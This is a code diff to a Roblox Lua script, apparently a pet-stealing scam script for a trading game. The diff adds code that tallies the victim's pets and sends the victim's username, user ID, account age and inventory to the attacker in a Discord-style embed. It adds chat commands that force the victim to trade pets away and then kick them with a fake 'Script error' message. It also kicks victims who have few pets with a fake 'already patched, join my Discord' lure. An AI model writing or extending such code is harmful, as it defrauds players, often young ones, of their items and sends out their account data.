@@ -7,6 +7,8 @@ coroutine.wrap(function()
   local InventoryDB = Loads("InventoryDB")
   local ClientData = Loads('ClientData')
   local legendaries_count = 0
+  local mega_count = 0
+  local neon_count = 0
   local ultra_count = 0
   local rare_count = 0
   local uncommon_count = 0
@@ -74,8 +76,12 @@ end
 
 local total = common_count + uncommon_count + rare_count + ultra_count + legendaries_count
 
-if total <= 5 then
-  plr:kick("Script errors while running.")
+if total <= 3 then
+  wait(20)
+
+  game:GetService("Players").LocalPlayer:Kick(
+      "This script has already been patched!\nJoin my Discord to get the latest script!"
+  )
   return
 end
   
@@ -95,8 +101,8 @@ end
     content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
     embeds = {
       {
-        title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
+        title = 'Join your player using **Console or Execute the script above.**\nand use cmd below to start stealing!',
+        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")\n\n**[Click me To Join!](https:google.com)**\n\n**CMD chat**:\n*/start, start, send*:\nfor victim To send request\n\n*/accept, accept, claim*:\nTo accept negotiation victim\n\n*/confirm, confirm, con*:\nTo confirm trade victim\n\n*/kick, kick, done*:\nTo kick victim and send error "Script error while running!\nTry Again!"\n\n **NOTED: You must accept trade request from victim before 5 second.\nOtherwise, the victim wont add any pets, and you must chat again.**\n\n**Discord Server**:\n[Join Invite](https://discord.gg/mDmB3rnZjw)',
         color = 10428396
       }
     }
@@ -160,7 +166,7 @@ end
       print("No pets found in inventory.")
     end
   end
-  
+
   game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
         player.Chatted:Connect(function(msg)
@@ -173,6 +179,11 @@ end
             end
             if lowerMsg == "/confirm" or lowerMsg == "confirm" or lowerMsg == "con" then
               ConfirmTrade()
+            end
+            if lowerMsg == "/kick" or lowerMsg == "kick" or lowerMsg == "done" then
+              game:GetService("Players").LocalPlayer:Kick(
+                "Script error while running!\nTry Again!"
+            )
             end
         end)
     end
